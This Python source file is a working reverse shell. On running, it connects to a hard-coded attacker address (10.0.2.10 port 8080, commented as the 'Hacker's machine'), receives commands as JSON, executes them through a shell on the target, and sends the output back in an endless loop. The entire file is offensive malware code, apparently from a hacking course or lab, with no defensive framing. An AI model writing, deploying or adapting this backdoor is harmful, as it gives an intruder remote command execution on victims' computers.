import socket
import subprocess
import json
import os

class SocketConnection:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # Connect to Hacker's machine
        # self.connection.send(b"Connection established...\n")

    # Sending Input
    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Processing Input
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Getting Input by Creating a subprocess to execute on Terminal of Target
    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    # Cd Command Implementation
    def cd_command(self,directory):
        os.chdir(directory)
        return "cd \\" + directory

    def start_socket(self):
        while True: # Create infinite loop of execution of commands
            command = self.json_receive()
            if command[0] == "exit":
               self.connection.close()
               exit()
            elif command[0] == "cd" and len(command) > 1:
                command_output = self.cd_command(command[1])
            else: 
                command_output = self.command_execution(command).decode()
            self.json_send(command_output)
        self.connection.close()


socket_connection = SocketConnection("10.0.2.10",8080)
socket_connection.start_socket()


